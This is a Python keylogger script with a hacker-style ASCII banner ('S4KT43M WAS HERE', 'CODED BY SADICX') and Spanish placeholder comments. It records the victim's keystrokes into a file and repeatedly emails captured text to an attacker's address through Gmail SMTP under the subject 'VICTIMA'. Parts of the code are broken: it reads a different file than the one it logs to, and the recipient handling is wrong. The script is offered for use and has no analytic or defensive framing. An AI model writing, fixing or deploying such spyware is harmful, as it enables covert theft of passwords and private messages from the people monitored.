
#          _.-*'""'*-._
#       .-"            "-.
#     ,"                  ",
#   .'      _.-.--.-._      ',
#  /     .-'.-"    "-.'-.     \
# /     /  /"'-.  .-'"\  \     \             S 4 K T 4 3 M
#:     :  :     ;:     ;  ;     ;           W A S   H E R E
#;     :  ; *   !! *   :  ;     :                 8)
#;      ; :   .'  '.   ; :      :
#:       \ \-'      '-/ /       ;
# \       '.'-_    _-'.'       /
#  \        '*-"-+"-*'        /
#   '.          /|          .'
#     *,       / |        ,*
#     / '-_            _-'  \
#    /     "*-.____.-*"      \
#   /            |            \
#  :    :        |        ;    ;
#  |.--.;        |        :.--.|
#  (   ()        |        ()   )
#   '--^_        |        _^--'
#      | "'*--.._I_..--*'" |
#      | __..._  | _..._   |
#     .'"      `"'"     ''"'.
#     """""""""""""""""""""""
#    C O D E D  B Y  S A D I C X

import threading
import os
import keyboard
import smtplib
from time import sleep
 
def keylogger():

    FILE_NAME = "keys.txt"
    CLEAR_ON_STARTUP = False
    TERMINATE_KEY = "enter"

    if CLEAR_ON_STARTUP:
        os.remove(FILE_NAME)
    
    output = open(FILE_NAME, "a")
    
    for string in keyboard.get_typed_strings(keyboard.record(TERMINATE_KEY)):
        output.write(string)
    
    output.close()

def sendmail():

     

   

    gmail_user = "tu correo"
    gmail_password = "tu contraseña"
    FROM =gmail_user
    TO = "al correo donde lo enviar"
    SUBJECT= "VICTIMA" 

        
    sleep(7.0)
    try:
        F = open("nuevo_documento.txt","r")

        TEXT= F.read()
        message = """\From: %s
To: %s
Subject: %s

%s
        """ % (FROM, ", ".join(TO), SUBJECT, TEXT)
    except:
        print("error")

    try: 
        server =smtplib.SMTP("smtp.gmail.com", 587)
        server.ehlo()
        server.starttls()
        server.login(gmail_user,gmail_password)
        server.sendmail(FROM, TO, message)
        server.close()
        print("eviado")
    except:
        print("error")


os.system("nano keys.txt")

while True:
 
    if __name__ == "__main__":
        
        key = threading.Thread(target=keylogger)
        mail = threading.Thread(target=sendmail)

 
        key.start()
        mail.start()
 
        key.join()
        mail.join()
 
